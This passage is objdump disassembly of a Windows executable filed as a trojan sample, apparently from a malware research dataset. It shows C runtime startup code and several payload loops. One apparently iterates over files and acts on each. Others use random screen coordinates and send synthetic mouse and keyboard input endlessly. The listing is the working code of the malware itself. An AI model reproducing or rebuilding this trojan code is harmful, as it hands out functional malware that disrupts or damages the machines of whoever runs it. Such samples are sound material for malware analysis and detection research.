
malware_samples/trojan/d282a0b0402753d66913aef53eb36ac5142343ca0325337b48c9680215fbb911.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	f3 c3                	repz ret
  401002:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401009:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401010:	83 ec 1c             	sub    $0x1c,%esp
  401013:	31 c0                	xor    %eax,%eax
  401015:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40101c:	4d 5a 
  40101e:	c7 05 40 a0 42 00 01 	movl   $0x1,0x42a040
  401025:	00 00 00 
  401028:	c7 05 3c a0 42 00 01 	movl   $0x1,0x42a03c
  40102f:	00 00 00 
  401032:	c7 05 38 a0 42 00 01 	movl   $0x1,0x42a038
  401039:	00 00 00 
  40103c:	c7 05 48 a0 42 00 01 	movl   $0x1,0x42a048
  401043:	00 00 00 
  401046:	74 68                	je     0x4010b0
  401048:	a3 08 a0 42 00       	mov    %eax,0x42a008
  40104d:	a1 4c a0 42 00       	mov    0x42a04c,%eax
  401052:	85 c0                	test   %eax,%eax
  401054:	74 4a                	je     0x4010a0
  401056:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  40105d:	e8 ce ed 00 00       	call   0x40fe30
  401062:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
  401069:	e8 62 cb 00 00       	call   0x40dbd0
  40106e:	8b 15 50 a0 42 00    	mov    0x42a050,%edx
  401074:	a3 b8 a4 42 00       	mov    %eax,0x42a4b8
  401079:	a3 bc a4 42 00       	mov    %eax,0x42a4bc
  40107e:	a1 18 b4 42 00       	mov    0x42b418,%eax
  401083:	89 10                	mov    %edx,(%eax)
  401085:	e8 d6 cd 00 00       	call   0x40de60
  40108a:	83 3d 18 a0 41 00 01 	cmpl   $0x1,0x41a018
  401091:	74 6d                	je     0x401100
  401093:	31 c0                	xor    %eax,%eax
  401095:	83 c4 1c             	add    $0x1c,%esp
  401098:	c3                   	ret
  401099:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4010a0:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  4010a7:	e8 84 ed 00 00       	call   0x40fe30
  4010ac:	eb b4                	jmp    0x401062
  4010ae:	66 90                	xchg   %ax,%ax
  4010b0:	8b 15 3c 00 40 00    	mov    0x40003c,%edx
  4010b6:	81 ba 00 00 40 00 50 	cmpl   $0x4550,0x400000(%edx)
  4010bd:	45 00 00 
  4010c0:	8d 8a 00 00 40 00    	lea    0x400000(%edx),%ecx
  4010c6:	75 80                	jne    0x401048
  4010c8:	0f b7 51 18          	movzwl 0x18(%ecx),%edx
  4010cc:	66 81 fa 0b 01       	cmp    $0x10b,%dx
  4010d1:	74 3f                	je     0x401112
  4010d3:	66 81 fa 0b 02       	cmp    $0x20b,%dx
  4010d8:	0f 85 6a ff ff ff    	jne    0x401048
  4010de:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%ecx)
  4010e5:	0f 86 5d ff ff ff    	jbe    0x401048
  4010eb:	8b 91 f8 00 00 00    	mov    0xf8(%ecx),%edx
  4010f1:	31 c0                	xor    %eax,%eax
  4010f3:	85 d2                	test   %edx,%edx
  4010f5:	0f 95 c0             	setne  %al
  4010f8:	e9 4b ff ff ff       	jmp    0x401048
  4010fd:	8d 76 00             	lea    0x0(%esi),%esi
  401100:	c7 04 24 d0 de 40 00 	movl   $0x40ded0,(%esp)
  401107:	e8 b4 cd 00 00       	call   0x40dec0
  40110c:	31 c0                	xor    %eax,%eax
  40110e:	83 c4 1c             	add    $0x1c,%esp
  401111:	c3                   	ret
  401112:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
  401116:	0f 86 2c ff ff ff    	jbe    0x401048
  40111c:	8b 89 e8 00 00 00    	mov    0xe8(%ecx),%ecx
  401122:	31 c0                	xor    %eax,%eax
  401124:	85 c9                	test   %ecx,%ecx
  401126:	0f 95 c0             	setne  %al
  401129:	e9 1a ff ff ff       	jmp    0x401048
  40112e:	66 90                	xchg   %ax,%ax
  401130:	83 ec 2c             	sub    $0x2c,%esp
  401133:	a1 54 a0 42 00       	mov    0x42a054,%eax
  401138:	c7 44 24 10 00 a0 42 	movl   $0x42a000,0x10(%esp)
  40113f:	00 
  401140:	c7 44 24 08 14 a0 42 	movl   $0x42a014,0x8(%esp)
  401147:	00 
  401148:	c7 44 24 04 18 a0 42 	movl   $0x42a018,0x4(%esp)
  40114f:	00 
  401150:	c7 04 24 1c a0 42 00 	movl   $0x42a01c,(%esp)
  401157:	a3 00 a0 42 00       	mov    %eax,0x42a000
  40115c:	a1 58 a0 42 00       	mov    0x42a058,%eax
  401161:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401165:	e8 ce ec 00 00       	call   0x40fe38
  40116a:	a3 10 a0 42 00       	mov    %eax,0x42a010
  40116f:	83 c4 2c             	add    $0x2c,%esp
  401172:	c3                   	ret
  401173:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  401179:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401180:	55                   	push   %ebp
  401181:	31 c0                	xor    %eax,%eax
  401183:	b9 11 00 00 00       	mov    $0x11,%ecx
  401188:	89 e5                	mov    %esp,%ebp
  40118a:	57                   	push   %edi
  40118b:	56                   	push   %esi
  40118c:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  40118f:	53                   	push   %ebx
  401190:	89 d7                	mov    %edx,%edi
  401192:	83 ec 7c             	sub    $0x7c,%esp
  401195:	f3 ab                	rep stos %eax,%es:(%edi)
  401197:	b0 30                	mov    $0x30,%al
  401199:	e8 62 d9 00 00       	call   0x40eb00
  40119e:	29 c4                	sub    %eax,%esp
  4011a0:	8d 44 24 1b          	lea    0x1b(%esp),%eax
  4011a4:	83 e0 f0             	and    $0xfffffff0,%eax
  4011a7:	c7 00 cc cc cc cc    	movl   $0xcccccccc,(%eax)
  4011ad:	c7 40 04 cc cc cc cc 	movl   $0xcccccccc,0x4(%eax)
  4011b4:	c7 40 08 cc cc cc cc 	movl   $0xcccccccc,0x8(%eax)
  4011bb:	c7 40 0c cc cc cc cc 	movl   $0xcccccccc,0xc(%eax)
  4011c2:	c7 40 10 cc cc cc cc 	movl   $0xcccccccc,0x10(%eax)
  4011c9:	c7 40 14 cc cc cc cc 	movl   $0xcccccccc,0x14(%eax)
  4011d0:	c7 40 18 cc cc cc cc 	movl   $0xcccccccc,0x18(%eax)
  4011d7:	c7 40 1c cc cc cc cc 	movl   $0xcccccccc,0x1c(%eax)
  4011de:	83 e4 f0             	and    $0xfffffff0,%esp
  4011e1:	8b 35 4c a0 42 00    	mov    0x42a04c,%esi
  4011e7:	85 f6                	test   %esi,%esi
  4011e9:	0f 85 81 02 00 00    	jne    0x401470
  4011ef:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  4011f5:	31 f6                	xor    %esi,%esi
  4011f7:	8b 58 04             	mov    0x4(%eax),%ebx
  4011fa:	8b 3d ac b3 42 00    	mov    0x42b3ac,%edi
  401200:	eb 14                	jmp    0x401216
  401202:	39 d8                	cmp    %ebx,%eax
  401204:	0f 84 07 02 00 00    	je     0x401411
  40120a:	c7 04 24 e8 03 00 00 	movl   $0x3e8,(%esp)
  401211:	ff d7                	call   *%edi
  401213:	83 ec 04             	sub    $0x4,%esp
  401216:	89 f0                	mov    %esi,%eax
  401218:	f0 0f b1 1d c0 a4 42 	lock cmpxchg %ebx,0x42a4c0
  40121f:	00 
  401220:	85 c0                	test   %eax,%eax
  401222:	75 de                	jne    0x401202
  401224:	a1 c4 a4 42 00       	mov    0x42a4c4,%eax
  401229:	31 db                	xor    %ebx,%ebx
  40122b:	83 f8 01             	cmp    $0x1,%eax
  40122e:	0f 84 f0 01 00 00    	je     0x401424
  401234:	a1 c4 a4 42 00       	mov    0x42a4c4,%eax
  401239:	85 c0                	test   %eax,%eax
  40123b:	0f 84 40 02 00 00    	je     0x401481
  401241:	c7 05 04 a0 42 00 01 	movl   $0x1,0x42a004
  401248:	00 00 00 
  40124b:	a1 c4 a4 42 00       	mov    0x42a4c4,%eax
  401250:	83 f8 01             	cmp    $0x1,%eax
  401253:	0f 84 e5 01 00 00    	je     0x40143e
  401259:	85 db                	test   %ebx,%ebx
  40125b:	0f 84 03 02 00 00    	je     0x401464
  401261:	a1 80 8f 42 00       	mov    0x428f80,%eax
  401266:	85 c0                	test   %eax,%eax
  401268:	74 1c                	je     0x401286
  40126a:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401271:	00 
  401272:	c7 44 24 04 02 00 00 	movl   $0x2,0x4(%esp)
  401279:	00 
  40127a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401281:	ff d0                	call   *%eax
  401283:	83 ec 0c             	sub    $0xc,%esp
  401286:	e8 45 ce 00 00       	call   0x40e0d0
  40128b:	c7 04 24 c0 dc 40 00 	movl   $0x40dcc0,(%esp)
  401292:	ff 15 a8 b3 42 00    	call   *0x42b3a8
  401298:	83 ec 04             	sub    $0x4,%esp
  40129b:	a3 5c a0 42 00       	mov    %eax,0x42a05c
  4012a0:	c7 04 24 00 10 40 00 	movl   $0x401000,(%esp)
  4012a7:	e8 a4 eb 00 00       	call   0x40fe50
  4012ac:	e8 df d0 00 00       	call   0x40e390
  4012b1:	a1 04 b4 42 00       	mov    0x42b404,%eax
  4012b6:	c7 05 b4 a4 42 00 00 	movl   $0x400000,0x42a4b4
  4012bd:	00 40 00 
  4012c0:	8b 00                	mov    (%eax),%eax
  4012c2:	85 c0                	test   %eax,%eax
  4012c4:	74 4e                	je     0x401314
  4012c6:	31 c9                	xor    %ecx,%ecx
  4012c8:	eb 17                	jmp    0x4012e1
  4012ca:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4012d0:	84 d2                	test   %dl,%dl
  4012d2:	74 3b                	je     0x40130f
  4012d4:	83 e1 01             	and    $0x1,%ecx
  4012d7:	74 2b                	je     0x401304
  4012d9:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012de:	83 c0 01             	add    $0x1,%eax
  4012e1:	0f b6 10             	movzbl (%eax),%edx
  4012e4:	80 fa 20             	cmp    $0x20,%dl
  4012e7:	7e e7                	jle    0x4012d0
  4012e9:	89 cb                	mov    %ecx,%ebx
  4012eb:	83 f3 01             	xor    $0x1,%ebx
  4012ee:	80 fa 22             	cmp    $0x22,%dl
  4012f1:	0f 44 cb             	cmove  %ebx,%ecx
  4012f4:	eb e8                	jmp    0x4012de
  4012f6:	8d 76 00             	lea    0x0(%esi),%esi
  4012f9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401300:	84 d2                	test   %dl,%dl
  401302:	74 0b                	je     0x40130f
  401304:	83 c0 01             	add    $0x1,%eax
  401307:	0f b6 10             	movzbl (%eax),%edx
  40130a:	80 fa 20             	cmp    $0x20,%dl
  40130d:	7e f1                	jle    0x401300
  40130f:	a3 b0 a4 42 00       	mov    %eax,0x42a4b0
  401314:	8b 1d 4c a0 42 00    	mov    0x42a04c,%ebx
  40131a:	85 db                	test   %ebx,%ebx
  40131c:	74 15                	je     0x401333
  40131e:	0f b7 55 d4          	movzwl -0x2c(%ebp),%edx
  401322:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  401326:	b8 0a 00 00 00       	mov    $0xa,%eax
  40132b:	0f 45 c2             	cmovne %edx,%eax
  40132e:	a3 00 a0 41 00       	mov    %eax,0x41a000
  401333:	a1 1c a0 42 00       	mov    0x42a01c,%eax
  401338:	89 45 90             	mov    %eax,-0x70(%ebp)
  40133b:	89 c6                	mov    %eax,%esi
  40133d:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  401344:	89 45 8c             	mov    %eax,-0x74(%ebp)
  401347:	89 04 24             	mov    %eax,(%esp)
  40134a:	e8 11 eb 00 00       	call   0x40fe60
  40134f:	85 f6                	test   %esi,%esi
  401351:	89 45 94             	mov    %eax,-0x6c(%ebp)
  401354:	8b 3d 18 a0 42 00    	mov    0x42a018,%edi
  40135a:	0f 8e 44 01 00 00    	jle    0x4014a4
  401360:	31 db                	xor    %ebx,%ebx
  401362:	89 fe                	mov    %edi,%esi
  401364:	8b 04 9e             	mov    (%esi,%ebx,4),%eax
  401367:	89 04 24             	mov    %eax,(%esp)
  40136a:	e8 21 11 00 00       	call   0x402490
  40136f:	8d 78 01             	lea    0x1(%eax),%edi
  401372:	89 3c 24             	mov    %edi,(%esp)
  401375:	e8 e6 ea 00 00       	call   0x40fe60
  40137a:	8b 4d 94             	mov    -0x6c(%ebp),%ecx
  40137d:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  401380:	8b 0c 9e             	mov    (%esi,%ebx,4),%ecx
  401383:	83 c3 01             	add    $0x1,%ebx
  401386:	89 7c 24 08          	mov    %edi,0x8(%esp)
  40138a:	89 04 24             	mov    %eax,(%esp)
  40138d:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  401391:	e8 02 11 00 00       	call   0x402498
  401396:	3b 5d 90             	cmp    -0x70(%ebp),%ebx
  401399:	75 c9                	jne    0x401364
  40139b:	8b 45 8c             	mov    -0x74(%ebp),%eax
  40139e:	83 e8 04             	sub    $0x4,%eax
  4013a1:	8b 75 94             	mov    -0x6c(%ebp),%esi
  4013a4:	c7 04 06 00 00 00 00 	movl   $0x0,(%esi,%eax,1)
  4013ab:	89 35 18 a0 42 00    	mov    %esi,0x42a018
  4013b1:	e8 6a d0 00 00       	call   0x40e420
  4013b6:	a1 f4 b3 42 00       	mov    0x42b3f4,%eax
  4013bb:	8b 15 14 a0 42 00    	mov    0x42a014,%edx
  4013c1:	89 10                	mov    %edx,(%eax)
  4013c3:	a1 14 a0 42 00       	mov    0x42a014,%eax
  4013c8:	89 44 24 08          	mov    %eax,0x8(%esp)
  4013cc:	a1 18 a0 42 00       	mov    0x42a018,%eax
  4013d1:	89 44 24 04          	mov    %eax,0x4(%esp)
  4013d5:	a1 1c a0 42 00       	mov    0x42a01c,%eax
  4013da:	89 04 24             	mov    %eax,(%esp)
  4013dd:	e8 70 0e 00 00       	call   0x402252
  4013e2:	8b 0d 08 a0 42 00    	mov    0x42a008,%ecx
  4013e8:	a3 0c a0 42 00       	mov    %eax,0x42a00c
  4013ed:	85 c9                	test   %ecx,%ecx
  4013ef:	0f 84 b6 00 00 00    	je     0x4014ab
  4013f5:	8b 15 04 a0 42 00    	mov    0x42a004,%edx
  4013fb:	85 d2                	test   %edx,%edx
  4013fd:	75 0a                	jne    0x401409
  4013ff:	e8 64 ea 00 00       	call   0x40fe68
  401404:	a1 0c a0 42 00       	mov    0x42a00c,%eax
  401409:	8d 65 f4             	lea    -0xc(%ebp),%esp
  40140c:	5b                   	pop    %ebx
  40140d:	5e                   	pop    %esi
  40140e:	5f                   	pop    %edi
  40140f:	5d                   	pop    %ebp
  401410:	c3                   	ret
  401411:	a1 c4 a4 42 00       	mov    0x42a4c4,%eax
  401416:	bb 01 00 00 00       	mov    $0x1,%ebx
  40141b:	83 f8 01             	cmp    $0x1,%eax
  40141e:	0f 85 10 fe ff ff    	jne    0x401234
  401424:	c7 04 24 1f 00 00 00 	movl   $0x1f,(%esp)
  40142b:	e8 40 ea 00 00       	call   0x40fe70
  401430:	a1 c4 a4 42 00       	mov    0x42a4c4,%eax
  401435:	83 f8 01             	cmp    $0x1,%eax
  401438:	0f 85 1b fe ff ff    	jne    0x401259
  40143e:	c7 44 24 04 08 c0 42 	movl   $0x42c008,0x4(%esp)
  401445:	00 
  401446:	c7 04 24 00 c0 42 00 	movl   $0x42c000,(%esp)
  40144d:	e8 26 ea 00 00       	call   0x40fe78
  401452:	85 db                	test   %ebx,%ebx
  401454:	c7 05 c4 a4 42 00 02 	movl   $0x2,0x42a4c4
  40145b:	00 00 00 
  40145e:	0f 85 fd fd ff ff    	jne    0x401261
  401464:	87 1d c0 a4 42 00    	xchg   %ebx,0x42a4c0
  40146a:	e9 f2 fd ff ff       	jmp    0x401261
  40146f:	90                   	nop
  401470:	89 14 24             	mov    %edx,(%esp)
  401473:	ff 15 5c b3 42 00    	call   *0x42b35c
  401479:	83 ec 04             	sub    $0x4,%esp
  40147c:	e9 6e fd ff ff       	jmp    0x4011ef
  401481:	c7 05 c4 a4 42 00 01 	movl   $0x1,0x42a4c4
  401488:	00 00 00 
  40148b:	c7 44 24 04 18 c0 42 	movl   $0x42c018,0x4(%esp)
  401492:	00 
  401493:	c7 04 24 0c c0 42 00 	movl   $0x42c00c,(%esp)
  40149a:	e8 d9 e9 00 00       	call   0x40fe78
  40149f:	e9 a7 fd ff ff       	jmp    0x40124b
  4014a4:	31 c0                	xor    %eax,%eax
  4014a6:	e9 f6 fe ff ff       	jmp    0x4013a1
  4014ab:	89 04 24             	mov    %eax,(%esp)
  4014ae:	e8 cd e9 00 00       	call   0x40fe80
  4014b3:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4014b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4014c0:	83 ec 0c             	sub    $0xc,%esp
  4014c3:	c7 05 4c a0 42 00 01 	movl   $0x1,0x42a04c
  4014ca:	00 00 00 
  4014cd:	e8 6e cf 00 00       	call   0x40e440
  4014d2:	83 c4 0c             	add    $0xc,%esp
  4014d5:	e9 a6 fc ff ff       	jmp    0x401180
  4014da:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4014e0:	83 ec 0c             	sub    $0xc,%esp
  4014e3:	c7 05 4c a0 42 00 00 	movl   $0x0,0x42a04c
  4014ea:	00 00 00 
  4014ed:	e8 4e cf 00 00       	call   0x40e440
  4014f2:	83 c4 0c             	add    $0xc,%esp
  4014f5:	e9 86 fc ff ff       	jmp    0x401180
  4014fa:	90                   	nop
  4014fb:	90                   	nop
  4014fc:	90                   	nop
  4014fd:	90                   	nop
  4014fe:	90                   	nop
  4014ff:	90                   	nop
  401500:	55                   	push   %ebp
  401501:	89 e5                	mov    %esp,%ebp
  401503:	83 ec 18             	sub    $0x18,%esp
  401506:	c7 44 24 04 05 00 00 	movl   $0x5,0x4(%esp)
  40150d:	00 
  40150e:	8b 45 08             	mov    0x8(%ebp),%eax
  401511:	89 04 24             	mov    %eax,(%esp)
  401514:	a1 dc b4 42 00       	mov    0x42b4dc,%eax
  401519:	ff d0                	call   *%eax
  40151b:	83 ec 08             	sub    $0x8,%esp
  40151e:	b8 01 00 00 00       	mov    $0x1,%eax
  401523:	c9                   	leave
  401524:	c2 08 00             	ret    $0x8
  401527:	55                   	push   %ebp
  401528:	89 e5                	mov    %esp,%ebp
  40152a:	83 ec 18             	sub    $0x18,%esp
  40152d:	a1 b8 b4 42 00       	mov    0x42b4b8,%eax
  401532:	ff d0                	call   *%eax
  401534:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40153b:	00 
  40153c:	c7 44 24 04 00 15 40 	movl   $0x401500,0x4(%esp)
  401543:	00 
  401544:	89 04 24             	mov    %eax,(%esp)
  401547:	a1 b0 b4 42 00       	mov    0x42b4b0,%eax
  40154c:	ff d0                	call   *%eax
  40154e:	83 ec 0c             	sub    $0xc,%esp
  401551:	c7 04 24 32 00 00 00 	movl   $0x32,(%esp)
  401558:	a1 ac b3 42 00       	mov    0x42b3ac,%eax
  40155d:	ff d0                	call   *%eax
  40155f:	83 ec 04             	sub    $0x4,%esp
  401562:	eb c9                	jmp    0x40152d
  401564:	55                   	push   %ebp
  401565:	89 e5                	mov    %esp,%ebp
  401567:	81 ec 78 01 00 00    	sub    $0x178,%esp
  40156d:	c7 45 f4 00 f0 41 00 	movl   $0x41f000,-0xc(%ebp)
  401574:	8d 85 b0 fe ff ff    	lea    -0x150(%ebp),%eax
  40157a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40157e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401581:	89 04 24             	mov    %eax,(%esp)
  401584:	a1 30 b3 42 00       	mov    0x42b330,%eax
  401589:	ff d0                	call   *%eax
  40158b:	83 ec 08             	sub    $0x8,%esp
  40158e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401591:	c7 44 24 14 0a 00 00 	movl   $0xa,0x14(%esp)
  401598:	00 
  401599:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4015a0:	00 
  4015a1:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4015a8:	00 
  4015a9:	8d 85 b0 fe ff ff    	lea    -0x150(%ebp),%eax
  4015af:	83 c0 2c             	add    $0x2c,%eax
  4015b2:	89 44 24 08          	mov    %eax,0x8(%esp)
  4015b6:	c7 44 24 04 18 f0 41 	movl   $0x41f018,0x4(%esp)
  4015bd:	00 
  4015be:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4015c5:	a1 a0 b4 42 00       	mov    0x42b4a0,%eax
  4015ca:	ff d0                	call   *%eax
  4015cc:	83 ec 18             	sub    $0x18,%esp
  4015cf:	eb 4f                	jmp    0x401620
  4015d1:	c7 44 24 14 0a 00 00 	movl   $0xa,0x14(%esp)
  4015d8:	00 
  4015d9:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4015e0:	00 
  4015e1:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4015e8:	00 
  4015e9:	8d 85 b0 fe ff ff    	lea    -0x150(%ebp),%eax
  4015ef:	83 c0 2c             	add    $0x2c,%eax
  4015f2:	89 44 24 08          	mov    %eax,0x8(%esp)
  4015f6:	c7 44 24 04 18 f0 41 	movl   $0x41f018,0x4(%esp)
  4015fd:	00 
  4015fe:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401605:	a1 a0 b4 42 00       	mov    0x42b4a0,%eax
  40160a:	ff d0                	call   *%eax
  40160c:	83 ec 18             	sub    $0x18,%esp
  40160f:	c7 04 24 7a 00 00 00 	movl   $0x7a,(%esp)
  401616:	a1 ac b3 42 00       	mov    0x42b3ac,%eax
  40161b:	ff d0                	call   *%eax
  40161d:	83 ec 04             	sub    $0x4,%esp
  401620:	8d 85 b0 fe ff ff    	lea    -0x150(%ebp),%eax
  401626:	89 44 24 04          	mov    %eax,0x4(%esp)
  40162a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40162d:	89 04 24             	mov    %eax,(%esp)
  401630:	a1 34 b3 42 00       	mov    0x42b334,%eax
  401635:	ff d0                	call   *%eax
  401637:	83 ec 08             	sub    $0x8,%esp
  40163a:	85 c0                	test   %eax,%eax
  40163c:	0f 95 c0             	setne  %al
  40163f:	84 c0                	test   %al,%al
  401641:	75 8e                	jne    0x4015d1
  401643:	e9 2c ff ff ff       	jmp    0x401574
  401648:	55                   	push   %ebp
  401649:	89 e5                	mov    %esp,%ebp
  40164b:	57                   	push   %edi
  40164c:	56                   	push   %esi
  40164d:	53                   	push   %ebx
  40164e:	83 ec 3c             	sub    $0x3c,%esp
  401651:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401658:	a1 bc b4 42 00       	mov    0x42b4bc,%eax
  40165d:	ff d0                	call   *%eax
  40165f:	83 ec 04             	sub    $0x4,%esp
  401662:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401665:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  40166c:	a1 bc b4 42 00       	mov    0x42b4bc,%eax
  401671:	ff d0                	call   *%eax
  401673:	83 ec 04             	sub    $0x4,%esp
  401676:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401679:	a1 b8 b4 42 00       	mov    0x42b4b8,%eax
  40167e:	ff d0                	call   *%eax
  401680:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401683:	e8 00 e8 00 00       	call   0x40fe88
  401688:	99                   	cltd
  401689:	f7 7d e0             	idivl  -0x20(%ebp)
  40168c:	89 d7                	mov    %edx,%edi
  40168e:	e8 f5 e7 00 00       	call   0x40fe88
  401693:	99                   	cltd
  401694:	f7 7d e4             	idivl  -0x1c(%ebp)
  401697:	89 d6                	mov    %edx,%esi
  401699:	e8 ea e7 00 00       	call   0x40fe88
  40169e:	99                   	cltd
  40169f:	f7 7d e0             	idivl  -0x20(%ebp)
  4016a2:	89 d3                	mov    %edx,%ebx
  4016a4:	e8 df e7 00 00       	call   0x40fe88
  4016a9:	99                   	cltd
  4016aa:	f7 7d e4             	idivl  -0x1c(%ebp)
  4016ad:	89 d0                	mov    %edx,%eax
  4016af:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  4016b6:	00 
  4016b7:	89 7c 24 10          	mov    %edi,0x10(%esp)
  4016bb:	89 74 24 0c          	mov    %esi,0xc(%esp)
  4016bf:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  4016c3:	89 44 24 04          	mov    %eax,0x4(%esp)
  4016c7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4016ca:	89 04 24             	mov    %eax,(%esp)
  4016cd:	a1 c8 b4 42 00       	mov    0x42b4c8,%eax
  4016d2:	ff d0                	call   *%eax
  4016d4:	83 ec 18             	sub    $0x18,%esp
  4016d7:	e8 ac e7 00 00       	call   0x40fe88
  4016dc:	89 c1                	mov    %eax,%ecx
  4016de:	ba 1f 85 eb 51       	mov    $0x51eb851f,%edx
  4016e3:	89 c8                	mov    %ecx,%eax
  4016e5:	f7 ea                	imul   %edx
  4016e7:	c1 fa 04             	sar    $0x4,%edx
  4016ea:	89 c8                	mov    %ecx,%eax
  4016ec:	c1 f8 1f             	sar    $0x1f,%eax
  4016ef:	29 c2                	sub    %eax,%edx
  4016f1:	89 d0                	mov    %edx,%eax
  4016f3:	6b c0 32             	imul   $0x32,%eax,%eax
  4016f6:	29 c1                	sub    %eax,%ecx
  4016f8:	89 c8                	mov    %ecx,%eax
  4016fa:	89 04 24             	mov    %eax,(%esp)
  4016fd:	a1 ac b3 42 00       	mov    0x42b3ac,%eax
  401702:	ff d0                	call   *%eax
  401704:	83 ec 04             	sub    $0x4,%esp
  401707:	e9 45 ff ff ff       	jmp    0x401651
  40170c:	55                   	push   %ebp
  40170d:	89 e5                	mov    %esp,%ebp
  40170f:	83 ec 38             	sub    $0x38,%esp
  401712:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401719:	a1 bc b4 42 00       	mov    0x42b4bc,%eax
  40171e:	ff d0                	call   *%eax
  401720:	83 ec 04             	sub    $0x4,%esp
  401723:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401726:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  40172d:	a1 bc b4 42 00       	mov    0x42b4bc,%eax
  401732:	ff d0                	call   *%eax
  401734:	83 ec 04             	sub    $0x4,%esp
  401737:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40173a:	e8 49 e7 00 00       	call   0x40fe88
  40173f:	99                   	cltd
  401740:	f7 7d f4             	idivl  -0xc(%ebp)
  401743:	89 55 ec             	mov    %edx,-0x14(%ebp)
  401746:	e8 3d e7 00 00       	call   0x40fe88
  40174b:	99                   	cltd
  40174c:	f7 7d f0             	idivl  -0x10(%ebp)
  40174f:	89 55 e8             	mov    %edx,-0x18(%ebp)
  401752:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401755:	89 44 24 04          	mov    %eax,0x4(%esp)
  401759:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40175c:	89 04 24             	mov    %eax,(%esp)
  40175f:	a1 d4 b4 42 00       	mov    0x42b4d4,%eax
  401764:	ff d0                	call   *%eax
  401766:	83 ec 08             	sub    $0x8,%esp
  401769:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  401770:	00 
  401771:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  401778:	00 
  401779:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401780:	00 
  401781:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401788:	00 
  401789:	c7 04 24 06 00 00 00 	movl   $0x6,(%esp)
  401790:	a1 e8 b4 42 00       	mov    0x42b4e8,%eax
  401795:	ff d0                	call   *%eax
  401797:	83 ec 14             	sub    $0x14,%esp
  40179a:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4017a1:	00 
  4017a2:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4017a9:	00 
  4017aa:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4017b1:	00 
  4017b2:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4017b9:	00 
  4017ba:	c7 04 24 18 00 00 00 	movl   $0x18,(%esp)
  4017c1:	a1 e8 b4 42 00       	mov    0x42b4e8,%eax
  4017c6:	ff d0                	call   *%eax
  4017c8:	83 ec 14             	sub    $0x14,%esp
  4017cb:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  4017d2:	a1 ac b3 42 00       	mov    0x42b3ac,%eax
  4017d7:	ff d0                	call   *%eax
  4017d9:	83 ec 04             	sub    $0x4,%esp
  4017dc:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4017e3:	00 
  4017e4:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4017eb:	00 
  4017ec:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4017f3:	00 
  4017f4:	c7 04 24 10 00 00 00 	movl   $0x10,(%esp)
  4017fb:	a1 e4 b4 42 00       	mov    0x42b4e4,%eax
  401800:	ff d0                	call   *%eax
  401802:	83 ec 10             	sub    $0x10,%esp
  401805:	c7 04 24 0a 00 00 00 	movl   $0xa,(%esp)
  40180c:	a1 ac b3 42 00       	mov    0x42b3ac,%eax
  401811:	ff d0                	call   *%eax
